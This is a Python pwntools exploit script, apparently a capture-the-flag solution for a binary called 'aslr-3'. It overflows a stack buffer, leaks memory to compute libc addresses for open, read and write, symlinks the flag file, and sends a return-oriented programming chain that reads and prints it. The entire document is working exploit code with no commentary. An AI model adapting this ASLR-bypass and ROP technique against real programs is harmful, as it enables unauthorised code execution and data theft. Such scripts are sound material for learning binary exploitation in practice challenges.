#!/usr/bin/env python

from pwn import *
import os

p = process('./aslr-3')

buf = "A" * 0x88 + "BBBB"

addr_input_func = p32(0x8048533)

buf += addr_input_func

#gdb.attach(p)

print(p.recv())
p.sendline(buf)
print(p.recv())
p.sendline("200")
data = p.recv()

print(len(data))
print(repr(data))

mylist = []
for i in range(len(data)/4):
    addr = u32(data[i*4:i*4+4])
    mylist.append(hex(addr))
    print (hex(addr))

print (mylist[36])


open_int = int(mylist[36], 16) - 904218
read_int = open_int + 1040
write_int = read_int + 112

open_ = p32(open_int)
read_ = p32(read_int)
write_= p32(write_int)


pop_pop_pop_ret = p32(0x08048669)

string = p32(0x8048798)
if os.path.exists("@"):
    os.unlink("@")

os.symlink("./flag", "@")

buf += open_
buf += pop_pop_pop_ret
buf += string
buf += p32(0)
buf += p32(0)

buf += read_
buf += pop_pop_pop_ret
buf += p32(3)
buf += p32(0x804a800)
buf += p32(100)

buf += write_
buf += pop_pop_pop_ret
buf += p32(1)
buf += p32(0x804a800)
buf += p32(100)



with open("e.txt", "w") as f:
    f.write(buf)
    f.close


p.sendline(buf)
p.interactive()

